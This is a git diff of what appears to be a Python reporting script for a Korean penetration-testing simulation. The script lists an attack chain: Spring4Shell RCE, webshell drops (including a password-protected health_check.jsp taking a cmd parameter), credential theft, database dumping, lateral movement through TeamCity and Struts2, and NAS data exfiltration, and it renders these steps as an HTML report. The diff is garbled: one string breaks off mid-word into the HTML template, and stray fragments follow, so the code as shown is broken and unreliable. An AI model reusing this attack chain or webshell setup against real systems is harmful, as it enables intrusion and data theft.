@@ -497,73 +497,70 @@ try {
         "step4": "STEP 4 | Stage2 Deployed (curl or docker cp)",
         "step5": "STEP 5 | Stage2 (health_check.jsp) Verified",
         "step6": "STEP 6 | Info Leakage (Find DB Clients & Configs via RCE)",
-        "step7": "STEP 7 | Threat Demonstration (Internal DB Access via RCE)",
-        "step8": "STEP 8 | Lateral Movement (TeamCity -> Struts2 Staff DB)",
-        "step9": "STEP 9 | Advanced Post-Exploitation (NAS SMB Product Designs)",
-    }
-
-    all_pass = True
-    for key, label in labels.items():
-        passed = results.get(key, False)
-        icon   = "[OK]" if passed else "[XX]"
-        print(f"  {icon}  {label}")
-        if not passed:
-            all_pass = False
-
-    print()
-    if all_pass:
-        print("  [SUCCESS] All steps passed! Spring4Shell RCE exploit complete.")
-    else:
-        print("  [WARNING] Some steps failed. Check the results above.")
-
-    print()
-    print(f"  Stage1 URL : {STAGER_URL}?cmd=id")
-    print(f"  Stage2 URL : {BASE}/health_check.jsp?pwd=glory&cmd=id")
-
-    # ══════════════════════════════════════════════════════════
-    # 브라우저용 HTML 보고서 생성
-    # ══════════════════════════════════════════════════════════
-    now = datetime.datetime.now()
-    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
-
-    html_content = f"""
+        "step7": "ST    html_content = f"""
     <!DOCTYPE html>
     <html lang="ko">
     <head>
         <meta charset="UTF-8">
-        <title>[메인 시나리오] Spring4Shell 모의해킹 최종 결과 보고서</title>
+        <title>sl-cyber-shield | Automated Exploitation Report</title>
         <style>
-            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: #e6e6e6; margin: 0; padding: 20px; }}
-            .container {{ max-width: 950px; margin: auto; background: #16213e; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #0f3460; }}
-            h1 {{ color: #e94560; text-align: center; border-bottom: 2px solid #0f3460; padding-bottom: 10px; }}
-            h2 {{ color: #438a5e; margin-top: 30px; border-bottom: 1px dashed #0f3460; padding-bottom: 5px; }}
-            .summary {{ background: #0f3460; padding: 15px; border-radius: 5px; margin-bottom: 30px; box-shadow: inset 0 0 10px rgba(0,0,0,0.3); }}
-            .step {{ margin-bottom: 20px; padding: 15px; border-left: 5px solid #bdc3c7; background: #1a1a2e; }}
-            .step.success {{ border-left-color: #e94560; border-top: 1px solid rgba(233, 69, 96, 0.2); border-right: 1px solid rgba(233, 69, 96, 0.2); border-bottom: 1px solid rgba(233, 69, 96, 0.2); }}
-            .step.fail {{ border-left-color: #555; }}
-            .badge-success {{ background: #e94560; color: white; padding: 4px 10px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
-            .badge-fail {{ background: #555; color: white; padding: 4px 10px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
-            pre {{ background: #111; color: #0f0; padding: 12px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; margin-top: 5px; border: 1px solid #333; }}
-            .footer {{ text-align: center; margin-top: 40px; color: #7f8c8d; font-size: 0.9em; }}
-            .desc {{ color: #ccc; line-height: 1.6; margin-bottom: 15px; font-size: 1.05em; }}
-            .res-box {{ background-color: rgba(0,0,0,0.3); padding: 15px; border: 1px solid #333; border-radius: 5px; margin-top: 10px; }}
+            :root {{
+                --sl-dark-blue: #151C5A;
+                --sl-blue-2: #065590;
+                --sl-blue-3: #0192BF;
+            }}
+            body {{ font-family: 'Segoe UI', Arial, sans-serif; background-color: #05081a; color: #e6e6e6; margin: 0; padding: 20px; }}
+            .container {{ max-width: 1000px; margin: auto; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0,0,0,0.8); }}
+            h1 {{ color: var(--sl-blue-3); text-align: center; border-bottom: 2px solid var(--sl-dark-blue); padding-bottom: 15px; font-weight: 700; letter-spacing: -1px; }}
+            h2 {{ color: var(--sl-blue-3); margin-top: 35px; border-bottom: 1px dashed var(--sl-dark-blue); padding-bottom: 8px; font-size: 1.4em; }}
+            .summary {{ background: rgba(21, 28, 90, 0.3); padding: 25px; border-radius: 10px; margin-bottom: 35px; border: 1px solid var(--sl-dark-blue); }}
+            .step {{ margin-bottom: 25px; padding: 20px; border-left: 6px solid #444; background: rgba(0, 0, 0, 0.2); border-radius: 0 8px 8px 0; }}
+            .step.success {{ border-left-color: var(--sl-blue-3); border-top: 1px solid rgba(1, 146, 191, 0.1); }}
+            .step.fail {{ border-left-color: #555; opacity: 0.7; }}
+            .badge-success {{ background: var(--sl-blue-3); color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
+            .badge-fail {{ background: #555; color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
+            pre {{ background: #000; color: #00ff41; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Monaco', monospace; margin-top: 10px; border: 1px solid #333; font-size: 12px; }}
+            .footer {{ text-align: center; margin-top: 50px; color: #555; font-size: 0.85em; border-top: 1px solid #222; padding-top: 20px; }}
+            .desc {{ color: #bbb; line-height: 1.7; margin-bottom: 20px; font-size: 1.05em; }}
+            .res-box {{ background-color: rgba(0,0,0,0.4); padding: 20px; border: 1px solid #222; border-radius: 8px; margin-top: 15px; }}
             .cred-highlight {{ color: #f39c12; font-weight: bold; }}
-            ul.creds {{ list-style-type: none; padding-left: 0; margin-top: 10px; }}
-            ul.creds li {{ background: #0b1a2e; margin-bottom: 5px; padding: 8px; border-left: 3px solid #f39c12; font-family: monospace; }}
+            ul.creds {{ list-style-type: none; padding-left: 0; margin-top: 15px; }}
+            ul.creds li {{ background: rgba(255, 255, 255, 0.02); margin-bottom: 8px; padding: 12px; border-left: 4px solid var(--sl-blue-3); font-family: monospace; font-size: 13px; }}
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🛡️ [메인 시나리오] Spring4Shell 제로데이 연계 공격 결과 보고서 <br><span style="font-size: 0.5em; color: #7f8c8d;">({current_time})</span></h1>
+            <div style="text-align:right; font-size:12px; color:var(--sl-blue-3); font-weight:900; letter-spacing:2px; margin-bottom:10px;">SL CYBER-SHIELD | SCS-EP</div>
+            <h1>🛡️ [MAIN SCENARIO] sl-cyber-shield 침투 분석 결과 보고서 <br><span style="font-size: 0.45em; color: #555; font-weight:400;">(Generated At: {current_time})</span></h1>
             
             <div class="summary">
-                <h2 style="color:#fff; margin-top:0;">실습 개요</h2>
+                <h2 style="color:white; margin-top:0;">1. 시뮬레이션 개요 (Simulation Summary)</h2>
                 <p class="desc">
-                    본 보고서는 <strong>Spring4Shell(CVE-2022-22965)</strong>을 거점으로, 
-                    TeamCity(CVE-2024-27198)와 Struts2(CVE-2023-50164)로 횡적 이동을 연계 수행하고 
-                    사내망 기밀 NAS 데이터를 탈취하는 APT 모의해킹 통합 시나리오 결과를 기록합니다.
+                    본 보고서는 <strong>Spring4Shell(CVE-2022-22965)</strong> 제로데이 취약점을 기점으로 
+                    TeamCity 및 Struts2 취약점을 연계 공격하여 사내 핵심 자산(NAS 도면 데이터)을 탈취하는 
+                    <strong>APT(Advanced Persistent Threat)</strong> 시뮬레이션 전 과정을 기록합니다.
                 </p>
-                <p><strong>공격 대상 서버 주소:</strong> <a style="color:#e94560;" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px; font-size:14px;">
+                    <p><strong>공격 대상 엔드포인트:</strong> <br><a style="color:var(--sl-blue-3);" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
+                    <p><strong>최종 실습 판정:</strong> <br>{'<span class="badge-success" style="font-size:18px; padding:10px 20px; display:inline-block; margin-top:5px;">전체 시나리오 장악 성공</span>' if all_pass else '<span class="badge-fail">일부 과정 차단됨</span>'}</p>
+                </div>
+            </div>
+
+            <h2 style="color:white;">2. 단계별 공격 수행 상세 내역 (Detailed Attack Timeline)</h2>
+    """
+
+    step_descriptions = {{
+        "step1": "Spring Framework Data Binding 취약점을 이용한 Tomcat 로그 속성 변조 시도 및 페이로드 전송.",
+        "step2": "Webshell Drop: 물리 디스크 내 yaho4.jsp 생성을 유도하는 트리거 트래픽 발생.",
+        "step3": "1단계 웹쉘(Stager) 접속 상태 점검을 통해 초기 침투 성공(RCE) 여부 확인.",
+        "step4": "Post-Exploitation: 내부 침투 심화를 위한 완성형 Stage2 웹쉘(health_check.jsp) 배포.",
+        "step5": "거점 확보 완료: 완성형 웹쉘의 무결성 및 명령 실행 권한 지속성 검증.",
+        "step6": "<strong>Credential Harvesting</strong>: RCE를 활용한 내부 인프라 DB 접속 정보 및 핵심 설정 파일 탐색/탈취.",
+        "step7": "<strong>Threat Simulation (DB)</strong>: 탈취된 계정을 재사용하여 내부망 DB(Spring DB) 테이블 무단 덤프.",
+        "step8": "<strong>Lateral Movement (Struts & TC)</strong>: 빌드 서버(TeamCity) 취약점 연계 및 Struts2 파일 업로드 취약점 악용을 통한 임직원 DB 탈취.",
+        "step9": "<strong>Exfiltration (NAS SMB)</strong>: 분리된 사내 연구망 NAS 스토리지의 접근 권한 확보 및 제품 설계 도면 리스트 탈취."
+    }}
+#e94560;" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
                 <p><strong>거점 웹쉘 주소:</strong> <a style="color:#438a5e;" href="{STAGE2_URL}" target="_blank">{STAGE2_URL}</a></p>
                 <p><strong>최종 실습 판정:</strong> {'<span class="badge-success">전체 시나리오 장악 성공</span>' if all_pass else '<span class="badge-fail">일부 과정 차단됨</span>'}</p>
             </div>
